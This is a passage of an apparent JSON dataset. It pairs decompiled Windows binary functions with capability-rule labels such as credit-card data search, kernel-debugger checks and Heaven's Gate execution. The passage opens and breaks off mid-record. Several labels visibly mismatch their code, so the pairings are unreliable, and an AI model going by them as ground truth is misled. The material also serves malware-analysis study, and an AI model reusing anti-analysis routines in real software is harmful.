    },
    "00065160": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t fcn.00065160(ulong arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    uVar1 = fcn.00066848();\n    iVar5 = fcn.0006682a(arg1, 0x2e);\n    if (iVar5 != 0) {\n        uVar2 = fcn.00066848(iVar5 + 1);\n        iVar5 = fcn.0006682a(iVar5 + 1, 0x2e);\n        if (iVar5 != 0) {\n            uVar3 = fcn.00066848(iVar5 + 1);\n            iVar5 = fcn.0006682a(iVar5 + 1, 0x2e);\n            if ((((iVar5 != 0) && (uVar4 = fcn.00066848(iVar5 + 1),  uVar1 < 0x100)) && (uVar2 < 0x100)) &&\n               ((uVar3 < 0x100 && (uVar4 < 0x100)))) {\n                return ((uVar4 << 8 | uVar3) << 8 | uVar2) << 8 | uVar1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 306
    },
    "000278a0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.000278a0(int64_t arg1, char *arg2)\n\n{\n    ulong arg3;\n    uchar auStack280 [272];\n    \n    if (*arg2 == '\\\\') {\n        if (((arg2[1] == '\\\\') && (arg2[2] == '.')) && (arg2[3] == '\\\\')) {\n            arg2 = arg2 + 4;\n        }\n        else if (((arg2[1] == '?') && (arg2[2] == '?')) && (arg2[3] == '\\\\')) {\n            arg3 = 0x11f28;\n            goto code_r0x000278ee;\n        }\n    }\n    arg3 = 0x11f20;\ncode_r0x000278ee:\n    fcn.00044350(auStack280, 0x104, arg3, arg2);\n    *(arg1 + 0x130) = 1;\n    fcn.0004d868(0, auStack280, arg1 + 8);\n    *(arg1 + 0x134) = 0;\n    return;\n}\n",
        "token_count": 241
    },
    "00030dc8": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.00030dc8(ulong arg1)\n\n{\n    uint32_t uStackX8;\n    \n    uStackX8 = arg1 << 0x18;\n    uStackX8 = uStackX8 | CONCAT12(arg1 >> 8, CONCAT11(arg1 >> 0x10, arg1 >> 0x18));\n    return uStackX8;\n}\n",
        "token_count": 86
    },
    "00031b54": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00031b54(int64_t *arg1, ushort *arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    \n    iVar1 = *arg1;\n    iVar9 = iVar1 + SUB168(SEXT816(-0x29406b2a1a85bd43) * SEXT816(iVar1) >> 0x40, 0);\n    iVar9 = (iVar9 >> 0x17) - (iVar9 >> 0x3f);\n    arg2[7] = (iVar1 + iVar9 * -10000000) / 10000;\n    uVar7 = iVar9 / 0x15180;\n    uVar8 = iVar9 + uVar7 * -0x15180;\n    if (uVar8 < 0) {\n        iVar4 = (-uVar8 - 1) / 0x15180 + 1;\n        uVar7 = uVar7 - iVar4;\n        uVar8 = uVar8 + iVar4 * 0x15180;\n    }\n    if (0x1517f < uVar8) {\n        uVar7 = uVar7 + uVar8 / 0x15180;\n        uVar8 = uVar8 % 0x15180;\n    }\n    arg2[4] = uVar8 / 0xe10;\n    iVar4 = uVar8 % 0xe10;\n    iVar3 = (iVar4 / 0x3c + (iVar4 >> 0x1f)) - (iVar4 * 0x88888889 >> 0x3f);\n    arg2[5] = iVar3;\n    arg2[6] = iVar4 + iVar3 * -0x3c;\n    iVar4 = 0x641;\n    uVar2 = 0;\n    arg2[2] = uVar7 + ((uVar7 / 7 + ((uVar7 >> 0x10) >> 0xf)) - (uVar7 * 0x92492493 >> 0x3f)) * -7;\n    while( true ) {\n        uVar8 = iVar4 >> 0x1f & 3;\n        uVar5 = uVar2;\n        if (((iVar4 + uVar8 & 3) == uVar8) && ((iVar4 != (iVar4 / 100) * 100 || (iVar4 == (iVar4 / 400) * 400)))) {\n            uVar5 = 1;\n        }\n        if (uVar7 < *(uVar5 * 4 + 0x14180)) break;\n        iVar4 = iVar4 + 1;\n        uVar7 = uVar7 - *(uVar5 * 4 + 0x14180);\n    }\n    *arg2 = iVar4;\n    piVar6 = uVar5 * 0x30 + 0x14190;\n    iVar4 = *piVar6;\n    while (iVar4 <= uVar7) {\n        uVar7 = uVar7 - iVar4;\n        uVar8 = uVar2 + 1;\n        uVar2 = uVar8;\n        iVar4 = piVar6[uVar8];\n    }\n    arg2[1] = uVar2 + 1;\n    arg2[3] = uVar7 + 1;\n    return;\n}\n",
        "token_count": 788
    },
    "0002f504": {
        "rules": [
            "compute adler32 checksum/9b5b0101cb1f4ee58265f4165dc89da1/add814525c1e453b80d52fb1e3a7e9dc"
        ],
        "decompiled_code": "\nint32_t fcn.0002f504(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    char acStackX16 [8];\n    uint64_t uStackX24;\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffeb8;\n    uint uVar4;\n    ulong uVar3;\n    uint64_t in_stack_fffffffffffffec0;\n    uint uVar5;\n    uchar auStack280 [16];\n    uint auStack264 [2];\n    ulong uStack256;\n    uchar *puStack248;\n    uint uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    uchar auStack200 [184];\n    \n    uVar4 = in_stack_fffffffffffffeb8 >> 0x20;\n    if (*0x7ee80 == '\\0') {\n        if (*0x7e550 == 0) {\n            iVar1 = -0x3fffffff;\n        }\n        else {\n            uVar2 = 0x7eee0;\n            *0x7eed8 = 0;\n            (*_fcn.00011608)(0x7eee0, 1);\n            *0x7eed0 = 0x7eec8;\n            *0x7eec8 = 0x7eec8;\n            iVar1 = fcn.0002ef10(uVar2 & 0xffffffffffffff00 | param_1, acStackX16);\n            if (iVar1 == 0) {\n                fcn.00028f8c(auStack200, 0x52);\n                fcn.00066704(auStack280, auStack200);\n                in_stack_fffffffffffffec0 = in_stack_fffffffffffffec0 & 0xffffffffffffff00;\n                uVar3 = CONCAT44(uVar4, 1);\n                iVar1 = (**0x113a0)(*0x7e550, 0, auStack280, 7, uVar3, in_stack_fffffffffffffec0, 0x7eeb8);\n                uVar4 = uVar3 >> 0x20;\n                uVar5 = in_stack_fffffffffffffec0 >> 0x20;\n                if ((iVar1 == 0) && (iVar1 = fcn.0002ee94(*0x7eeb8),  iVar1 == 0)) {\n                    *(*0x7eeb8 + 0x30) = *(*0x7eeb8 + 0x30) | 0x10;\n                    *(*0x7eeb8 + 0x30) = *(*0x7eeb8 + 0x30) & 0xffffff7f;\n                    iVar1 = fcn.000177a4(*0x7eeb8, 0x2e458, 0);\n                    if (iVar1 == 0) {\n                        auStack264[0] = 0x30;\n                        uStack256 = 0;\n                        uStack240 = 0;\n                        puStack248 = NULL;\n                        uStack232 = 0;\n                        uStack224 = 0;\n                        fcn.00029430(0x7eeb0);\n                        iVar1 = fcn.00066872(0x7ee90, 6, auStack264, 0x7eeb0, CONCAT44(uVar4, 4), \n                                             CONCAT44(uVar5, 0x18000000), 0);\n                        if (iVar1 == 0) {\n                            uStackX24 = *0x7eeb0;\n                            uVar2 = 0;\n                            uVar4 = 0;\n                            iVar1 = fcn.0006686c(*0x7ee90, 0xffffffffffffffff, 0x7eea0, 0, 0, 0, &uStackX24, 2, 0, 4);\n                            if (iVar1 == 0) {\n                                *0x7eeb0 = uStackX24;\n                                fcn.00028fe4(auStack200, 0x52);\n                                fcn.00066704(auStack280, auStack200);\n                                iVar1 = (**0x113a0)(*0x7e550, 0, auStack280, 7, CONCAT44(uVar4, 1), \n                                                    uVar2 & 0xffffffffffffff00, 0x7eec0);\n                                if ((iVar1 == 0) && (iVar1 = fcn.0002ee94(*0x7eec0),  iVar1 == 0)) {\n                                    *(*0x7eec0 + 0x30) = *(*0x7eec0 + 0x30) | 0x10;\n                                    *(*0x7eec0 + 0x30) = *(*0x7eec0 + 0x30) & 0xffffff7f;\n                                    iVar1 = fcn.000177a4(*0x7eec0, 0x2e458, 0);\n                                    if (iVar1 == 0) {\n                                        fcn.0002f974(1, *0x7eeb0 & 0xffffffff, 2, (*0x7eeb0 & 0xffffffff) >> 0xf);\n                                        *0x7ee81 = 0;\n                                        iVar1 = fcn.0001a9b0(0x7eef8, 0x2f490, 0);\n                                        if (iVar1 == 0) {\n                                            *0x7ee80 = 1;\n                                            if (acStackX16[0] == '\\0') {\n                                                fcn.00028f8c(auStack200, 0x52);\n                                                fcn.00066704(auStack280, auStack200);\n                                                puStack248 = auStack280;\n                                                auStack264[0] = 0x30;\n                                                uStack256 = 0;\n                                                uStack240 = 0x40;\n                                                uStack232 = 0;\n                                                uStack224 = 0;\n                                                iVar1 = fcn.0006673a();\n                                                if (iVar1 == 0) {\n                                                    fcn.000666f2(uStackX32);\n                                                    return 0;\n                                                }\n                                            }\n                                            fcn.0002f974(0, *0x7eea8, 2, *0x7eea8 >> 0xf);\n                                            return 0;\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (*0x7eeb8 != 0) {\n                (*_fcn.00011388)();\n                fcn.00017350(*0x7eeb8);\n                *0x7eeb8 = 0;\n            }\n            if (*0x7eec0 != 0) {\n                (*_fcn.00011388)();\n                fcn.00017350(*0x7eec0);\n                *0x7eec0 = 0;\n            }\n            if (*0x7eea0 != 0) {\n                fcn.00066866(0xffffffffffffffff);\n                *0x7eea0 = 0;\n            }\n            if (*0x7ee90 != 0) {\n                fcn.000666f2();\n                *0x7ee90 = 0;\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 1598
    },
    "000399e0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid fcn.000399e0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong in_stack_00000028;\n    uchar auStack56 [24];\n    \n    iVar1 = fcn.00039968(in_stack_00000028, auStack56);\n    if (iVar1 == 0) {\n        fcn.00033030(arg1, arg2, arg3, arg4);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "000447a8": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint32_t fcn.000447a8(uint32_t *arg1, ulong arg2)\n\n{\n    char cVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint8_t *puVar7;\n    bool bVar8;\n    \n    if (0x1e < arg2) {\n        bVar8 = *arg1 < *0x15998;\n        if ((*arg1 == *0x15998) && (bVar8 = *(arg1 + 1) < *0x1599c,  *(arg1 + 1) == *0x1599c)) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = (1 - bVar8) - (bVar8 != 0);\n        }\n        if (((iVar4 == 0) && (iVar5 = fcn.000668de(arg1 + 5),  iVar5 != 0)) && (*(iVar5 + 0xb) == '&')) {\n            cVar1 = *(iVar5 + 0xc);\n            iVar6 = 8;\n            uVar3 = 0;\n            puVar2 = iVar5 + 1;\n            do {\n                puVar7 = puVar2;\n                uVar3 = uVar3 + *puVar7;\n                iVar6 = iVar6 + -1;\n                puVar2 = puVar7 + 1;\n            } while (iVar6 != 0);\n            if (((puVar7[1] == uVar3 / 0x1a + 0x41) && (puVar7[2] == 0x7a - uVar3 % 0x1a)) &&\n               (iVar5 = fcn.000668de(puVar7 + 4, 0x20, (arg2 - 10) - 0xd),  iVar5 != 0)) {\n                bVar8 = *(iVar5 + 1) < *0x157c0;\n                if ((*(iVar5 + 1) == *0x157c0) && (bVar8 = *(iVar5 + 5) < *0x157c4,  *(iVar5 + 5) == *0x157c4)) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = (1 - bVar8) - (bVar8 != 0);\n                }\n                if (iVar4 == 0) {\n                    return 7 - (cVar1 != 'a');\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 579
    },
    "0003ad80": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nuint64_t fcn.0003ad80(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uchar auStackX16 [24];\n    uint64_t uVar4;\n    \n    uVar2 = 0;\n    fcn.00032650(0x8e710, auStackX16, 1);\n    if (0 < *0x8e700) {\n        piVar1 = *0x8e708 + 0x18;\n        uVar4 = uVar2;\n        do {\n            if (*piVar1 == arg1) {\n                uVar2 = *(uVar4 * 0x20 + 8 + *0x8e708);\n                break;\n            }\n            uVar3 = uVar4 + 1;\n            uVar4 = uVar3;\n            piVar1 = piVar1 + 4;\n        } while (uVar3 < *0x8e700);\n    }\n    fcn.00032684(0x8e710, auStackX16, 1);\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "0003aec4": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nulong * fcn.0003aec4(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    ulong *puVar7;\n    ulong *puVar8;\n    ulong *puVar9;\n    uint32_t uVar10;\n    bool bVar11;\n    ulong *puStackX24;\n    int64_t iStackX32;\n    uchar auStack88 [24];\n    \n    puVar9 = NULL;\n    uVar10 = 0;\n    fcn.00032650(0x8e710, auStack88, 1);\n    if (*0x8e708 != 0) {\n        iVar4 = *0x8e708;\n        puVar7 = puVar9;\n        puVar8 = puVar9;\n        iVar6 = *0x8e700;\n        if (0 < *0x8e700) {\n            do {\n                puVar2 = *(puVar8 + iVar4);\n                while (puVar2 != NULL) {\n                    puVar1 = *puVar2;\n                    fcn.00030d24(puVar2);\n                    puVar2 = puVar1;\n                    iVar4 = *0x8e708;\n                    iVar6 = *0x8e700;\n                }\n                uVar5 = puVar7 + 1;\n                puVar7 = uVar5;\n                puVar8 = puVar8 + 4;\n            } while (uVar5 < iVar6);\n        }\n        fcn.00030d24(iVar4);\n        *0x8e700 = 0;\n    }\n    *0x8e708 = 0;\n    if (arg2 == 0) {\n        iVar6 = 1;\n        iVar4 = arg1;\n        for (iVar3 = *(arg1 + 0x188); ((iVar3 != 0 && (iVar3 != iVar4)) && (iVar3 != iVar4 + 0x188));\n            iVar3 = *(iVar3 + 0x188)) {\n            iVar6 = iVar6 + 1;\n            iVar4 = iVar3;\n        }\n        iVar4 = iVar6 << 5;\n        *0x8e708 = fcn.00030cc4(iVar4);\n        if (*0x8e708 == 0) {\ncode_r0x0003b0dd:\n            uVar10 = 0xc000009a;\n        }\n        else {\n            fcn.0006677c(*0x8e708, 0, iVar4);\n            iStackX32 = 0;\n            puVar7 = puVar9;\n            if (0 < iVar6) {\ncode_r0x0003afdc:\n                *(puVar7 + *0x8e708 + 8) = arg1;\n                *(puVar7 + *0x8e708 + 0x10) = *(arg1 + 0x18);\n                *(puVar7 + *0x8e708 + 0x18) = *(arg1 + 0x38);\n                puStackX24 = NULL;\n                puVar8 = puVar9;\n                iVar4 = *(arg1 + 0x10);\n                do {\n                    puVar2 = fcn.00030cc4(0x20);\n                    if (puVar2 == NULL) goto joined_r0x0003b073;\n                    fcn.0006677c(puVar2, 0, 0x20);\n                    puVar2[1] = iVar4;\n                    puVar2[2] = *(iVar4 + 0x18);\n                    iVar3 = *(iVar4 + 0x10);\n                    puVar1 = puVar2;\n                    if (puStackX24 != NULL) {\n                        *puStackX24 = puVar2;\n                        puVar1 = puStackX24;\n                    }\n                    puStackX24 = puVar1;\n                    if (puVar8 == NULL) {\n                        puVar8 = puVar2;\n                    }\n                    puVar2 = puVar8;\n                } while ((iVar3 != 0) && (bVar11 = iVar3 != iVar4,  iVar4 = iVar3,  bVar11));\n                goto code_r0x0003b08b;\n            }\n        }\ncode_r0x0003b0e3:\n        *0x8e700 = iVar6;\n        if ((uVar10 != 0) && (*0x8e708 != 0)) {\n            iVar4 = *0x8e708;\n            puVar7 = puVar9;\n            if (0 < iVar6) {\n                do {\n                    puVar8 = *(puVar9 + iVar4);\n                    while (puVar8 != NULL) {\n                        puVar2 = *puVar8;\n                        fcn.00030d24(puVar8);\n                        puVar8 = puVar2;\n                        iVar4 = *0x8e708;\n                        iVar6 = *0x8e700;\n                    }\n                    uVar5 = puVar7 + 1;\n                    puVar9 = puVar9 + 4;\n                    puVar7 = uVar5;\n                } while (uVar5 < iVar6);\n            }\n            fcn.00030d24(iVar4);\n            *0x8e700 = 0;\n        }\n        puVar9 = uVar10;\n    }\n    fcn.00032684(0x8e710, auStack88, 1);\n    return puVar9;\njoined_r0x0003b073:\n    while (puVar2 = puVar9,  puVar8 != NULL) {\n        puVar2 = *puVar8;\n        fcn.00030d24(puVar8);\n        puVar8 = puVar2;\n    }\ncode_r0x0003b08b:\n    *(puVar7 + *0x8e708) = puVar2;\n    if (*(puVar7 + *0x8e708) == 0) goto code_r0x0003b0dd;\n    iVar4 = *(arg1 + 0x188);\n    if ((iVar4 == 0) || (iVar4 == arg1)) goto code_r0x0003b0e3;\n    iStackX32 = iStackX32 + 1;\n    puVar7 = puVar7 + 4;\n    arg1 = iVar4;\n    if (iVar6 <= iStackX32) goto code_r0x0003b0e3;\n    goto code_r0x0003afdc;\n}\n",
        "token_count": 1449
    },
    "0004bea0": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nuint fcn.0004bea0(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar2 = 0;\n    if (*0x8d318 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        fcn.00030310(0x8d300);\n        iVar5 = arg1 * 0x60;\n        iVar1 = fcn.0002748c(*(iVar5 + 0x6b638), 0);\n        *(iVar5 + 0x6b63c) = iVar1;\n        if (iVar1 == 0) {\n            *(iVar5 + 0x6b63c) = 0xffffffff;\n        }\n        iVar1 = fcn.0002748c(*(iVar5 + 0x6b640), 0);\n        *(iVar5 + 0x6b644) = iVar1;\n        if (iVar1 == 0) {\n            *(iVar5 + 0x6b644) = 0xffffffff;\n        }\n        if (*(iVar5 + 0x6b634) == 0) {\n            iVar4 = fcn.00031698(*(iVar5 + 0x6b688), 0x15d8c);\n            *(iVar5 + 0x6b680) = iVar4;\n            if (iVar4 == 0) {\n                uVar2 = fcn.00030eb8();\n            }\n            else {\n                fcn.0006677c(iVar5 + 0x6b648, 0, 0x28);\n                uVar3 = fcn.00031034(*(iVar5 + 0x6b680));\n                iVar1 = fcn.00031038(uVar3);\n                *(iVar5 + 0x6b668) = iVar1;\n                fcn.000274d4(*(iVar5 + 0x6b630), 1);\n                *(iVar5 + 0x6b634) = 1;\n            }\n        }\n        else {\n            uVar2 = 0x21590006;\n        }\n        fcn.00030378(0x8d300);\n    }\n    return uVar2;\n}\n",
        "token_count": 507
    },
    "0004c00c": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nbool fcn.0004c00c(ulong arg1)\n\n{\n    return *(arg1 * 0x60 + 0x6b634) != 0;\n}\n",
        "token_count": 39
    },
    "0004c154": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.0004c154(ulong arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = arg1 * 0x60 + 0x6b648;\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 63
    },
    "0004c16c": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid fcn.0004c16c(ulong arg1)\n\n{\n    int64_t *piVar1;\n    \n    piVar1 = arg1 * 0x60 + 0x6b650;\n    *piVar1 = *piVar1 + 1;\n    return;\n}\n",
        "token_count": 64
    },
    "0003fcb0": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t fcn.0003fcb0(ulong noname_0, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t arg1;\n    int32_t in_stack_00000028;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    int64_t iStack96;\n    ulong uStack88;\n    int64_t iStack80;\n    int64_t iStack72;\n    uint uVar8;\n    \n    iStack96 = 0;\n    bVar1 = false;\n    uVar5 = 0;\n    iVar4 = (**0x11140)(noname_0, arg2, 0, 0, 0);\n    if (iVar4 == 0) {\n        iVar2 = -0x3fffff66;\n    }\n    else {\n        iStack72 = iVar4;\n        arg1 = fcn.00030cc4(0x18);\n        iStack80 = arg1;\n        if (arg1 == 0) {\n            iVar2 = -0x3fffff66;\n        }\n        else {\n            (**0x11138)(iVar4, 0, 0);\n            bVar1 = true;\n            piVar7 = &iStack96;\n            uVar5 = uVar5 & 0xffffffff00000000;\n            uVar6 = arg2;\n            iVar2 = (**0x7fff8)(*0x80308, 0, 0, iVar4, uVar5, arg2, piVar7);\n            uVar8 = piVar7 >> 0x20;\n            if (iVar2 == 0) {\n                (*_fcn.00011608)(arg1, 1, 0);\n                iVar2 = (**0x7ffe8)(*0x80300, 0, 0, arg3, uVar5 & 0xffffffff00000000 | arg4, \n                                    uVar6 & 0xffffffffffff0000 | (-(in_stack_00000028 != 0) & 2) + 0x14, \n                                    CONCAT44(uVar8, 0x50000), iStack96, arg2, 0x3f744, arg1);\n                if (iVar2 == 0) {\n                    uStack88 = 0xffffffff88ca6c00;\n                    iVar3 = (*_fcn.00011630)(arg1, 0, 0, 0, &uStack88);\n                    if (iVar3 == 0x102) {\n                        iVar2 = -0x3fffffff;\n                    }\n                    else {\n                        iVar4 = 0;\n                        iStack96 = 0;\n                    }\n                }\n            }\n        }\n        if (iVar4 != 0) {\n            if (bVar1) {\n                (**0x11130)(iVar4);\n            }\n            (*_fcn.00011128)(iVar4);\n        }\n        if ((iStack96 != 0) && (iVar2 != 0)) {\n            (**0x7fff0)();\n        }\n        if (arg1 != 0) {\n            fcn.00030d24(arg1);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 724
    },
    "00040044": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nvoid fcn.00040044(int64_t arg1)\n\n{\n    (**0x7ffe8)(*0x80300, 0, 0, *(arg1 + 0x800), *(arg1 + 0x7fc), (-(*(arg1 + 0x6d0) == 0x17) & 2U) + 0x14, 0x90000, 0, \n                0, 0x3f744, 0);\n    return;\n}\n",
        "token_count": 110
    },
    "0004b534": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nvoid fcn.0004b534(ulong *arg1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    char in_DL;\n    int16_t *piVar5;\n    uchar auStackX24 [16];\n    ushort auStack184 [12];\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    int32_t iStack144;\n    int32_t iStack140;\n    int16_t aiStack120 [48];\n    \n    cVar2 = fcn.0004c00c(2);\n    if ((cVar2 != '\\0') && (-1 < *(arg1 + 3))) {\n        iVar3 = (**0x8d2a0)(*arg1, 0);\n        if (iVar3 != *0x6b628) {\n            *0x6b628 = iVar3;\n            iVar3 = fcn.0003205c(auStack184, 0x11);\n            if (iVar3 == 0) {\n                auStack184[0] = 0x3f;\n            }\n            fcn.00031204(auStackX24);\n            fcn.00031d40(auStackX24, &uStack160);\n            fcn.00066788(aiStack120, 0x15ca0, iStack140 + 0x76c, iStack144 + 1, uStack148, uStack152, uStack156, \n                         uStack160, auStack184);\n            uVar4 = 0xffffffffffffffff;\n            piVar5 = aiStack120;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            fcn.0004cafc(2, aiStack120, (~uVar4 - 1 & 0xffffffff) * 2);\n        }\n        fcn.0004cafc(2, arg1 + 2, (-(in_DL != '\\0') & 2) + 2);\n    }\n    return;\n}\n",
        "token_count": 493
    },
    "00052668": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.00052668(uint8_t param_1)\n\n{\n    if (param_1 < 0xa1) {\n        if (param_1 == 0xa0) {\n            return 0x169;\n        }\n        if (param_1 < 0x91) {\n            if (param_1 == 0x90) {\n                return 0x168;\n            }\n            if (param_1 == 0xc) {\n                return 0x177;\n            }\n            if (param_1 == 0xd) {\n                return 0x176;\n            }\n            if (param_1 == 0x1c) {\n                return 0x164;\n            }\n            if (param_1 == 0x1d) {\n                return 0x163;\n            }\n            if (param_1 == 0x8a) {\n                return 0x16d;\n            }\n            if (param_1 == 0x8e) {\n                return 0x16e;\n            }\n        }\n        else {\n            if (param_1 == 0x94) {\n                return 0x16b;\n            }\n            if (param_1 == 0x96) {\n                return 0x16f;\n            }\n            if (param_1 == 0x97) {\n                return 0x173;\n            }\n            if (param_1 == 0x9a) {\n                return 0x174;\n            }\n            if (param_1 == 0x9e) {\n                return 0x166;\n            }\n        }\n    }\n    else if (param_1 < 0xb1) {\n        if (param_1 == 0xb0) {\n            return 0x167;\n        }\n        if (param_1 == 0xa4) {\n            return 0x16a;\n        }\n        if (param_1 == 0xa6) {\n            return 0x170;\n        }\n        if (param_1 == 0xa7) {\n            return 0x172;\n        }\n        if (param_1 == 0xaa) {\n            return 0x175;\n        }\n        if (param_1 == 0xae) {\n            return 0x165;\n        }\n    }\n    else {\n        if (param_1 == 0xb4) {\n            return 0x16c;\n        }\n        if (param_1 == 0xb6) {\n            return 0x171;\n        }\n        if (param_1 == 0xb7) {\n            return 0x17f;\n        }\n        if (param_1 == 0xbb) {\n            return 0x1a4;\n        }\n        if (param_1 == 0xbf) {\n            return 0x15a;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 616
    },
    "00063120": {
        "rules": [
            "parse credit card information/2fba96855ce44cd2afbbefaf4df20b4d",
            "search for credit card data/546f8dc683b8415fa126b38355d21de5"
        ],
        "decompiled_code": "\nuint64_t fcn.00063120(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint32_t in_stack_00000028;\n    \n    iVar2 = fcn.00062ff4(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x45) || (pcVar1 = *(**arg1 + 0x11),  pcVar1 == NULL)) {\n            fcn.00062e90(arg1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            if (uVar3 == 0) {\n                uVar3 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n            }\n            uVar4 = uVar3;\n            fcn.00062e90(arg1);\n        }\n    }\n    else {\n        uVar4 = fcn.00064414(arg2, arg3, arg4, in_stack_00000028);\n    }\n    return uVar4;\n}\n",
        "token_count": 291
    },
    "00016c38": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.00016c38(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char16_t *pcVar3;\n    bool bVar4;\n    ulong auStackX16 [3];\n    uchar auStack264 [96];\n    uchar auStack168 [96];\n    uchar auStack72 [56];\n    \n    LOCK();\n    bVar4 = *0x7dcc8 == 0;\n    *0x7dcc8 = *0x7dcc8 ^ bVar4 * (*0x7dcc8 ^ 1);\n    if (!bVar4 * *0x7dcc8 != 1) {\n        fcn.0001cdec();\n        pcVar3 = L\"\\\\??\\\\C:\\\\Windows\";\n        fcn.0003066c(L\"\\\\??\\\\C:\\\\Windows\", 0x104);\n        fcn.0001fe78();\n        fcn.00036eb8();\n        iVar1 = fcn.0002f504(pcVar3 & 0xffffffffffffff00 | arg1 & 0xff);\n        if (iVar1 == 0) {\n            fcn.000666e6(*(*0x69080 + 0x28));\n        }\n        fcn.00066400();\n        fcn.00065f14();\n        fcn.00066614();\n        *0x8e928 = *(*0x69080 + 4);\n        *0x8ea68 = 1;\n        *0x8ea58 = 2;\n        *0x8ea60 = *0x69080;\n        *0x8ea38 = 0x1d344;\n        str.self._0_4_ = *0x116a0;\n        str.self[4] = *0x116a4;\n        fcn.0002948c(auStack264, 0x52);\n        fcn.000294dc(auStack168, 0x52);\n        iVar1 = (-(arg1 != 0) & 0xffffff8b) + 